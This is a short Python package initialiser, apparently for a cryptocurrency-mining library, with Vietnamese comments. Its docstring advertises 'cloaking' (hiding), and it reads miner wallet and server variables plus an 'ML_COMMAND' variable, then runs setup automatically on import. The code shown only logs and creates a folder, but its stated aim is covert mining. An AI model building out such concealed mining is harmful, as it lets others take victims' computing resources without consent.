"""
**Mining Environment Package** (gói môi trường khai thác)

Thư viện tổng hợp cho hệ thống khai thác tiền điện tử
với tính năng **cloaking** (che giấu) và **resource management** (quản lý tài nguyên).
"""

import logging
import os
import sys
from pathlib import Path

# Thiết lập **logging** (ghi nhật ký) cho **package** (gói)
logger = logging.getLogger(__name__)


def initialize_mining_environment():
    """Kích hoạt lớp môi trường khai thác"""
    
    # Kiểm tra biến môi trường cần thiết
    required_env_vars = ['LOGS_DIR', 'ML_COMMAND', 'MINING_SERVER_CPU', 'MINING_WALLET_CPU']
    missing_vars = [var for var in required_env_vars if not os.getenv(var)]
    
    if missing_vars:
        logger.warning(f"Thiếu biến môi trường: {missing_vars}")
    
    # Tạo thư mục **logs** (nhật ký) nếu chưa tồn tại
    logs_dir = os.getenv('LOGS_DIR', '/tmp/mining_logs')
    Path(logs_dir).mkdir(parents=True, exist_ok=True)
    
    logger.info("Môi trường **mining** (khai thác) đã được khởi tạo")


# Khởi tạo tự động khi **import package** (nhập gói)
initialize_mining_environment()
